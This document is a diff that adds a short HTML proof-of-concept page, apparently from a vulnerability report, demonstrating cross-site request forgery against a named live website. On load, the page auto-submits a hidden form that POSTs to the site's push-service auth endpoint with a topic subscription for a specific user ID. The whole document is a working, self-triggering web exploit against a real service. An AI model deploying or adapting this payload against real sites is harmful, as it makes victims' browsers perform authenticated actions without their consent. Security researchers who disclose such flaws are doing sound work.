@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF PoC - Chaturbate</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h1>CSRF PoC</h1>
+  <form action="https://chaturbate.com/push_service/auth/" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="topics" value='{"UserFollowerTopic#UserFollowerTopic:P8NNBK5":{"user_uid":"P8NNBK5"}}'>
+  </form>
+</body>
+</html>
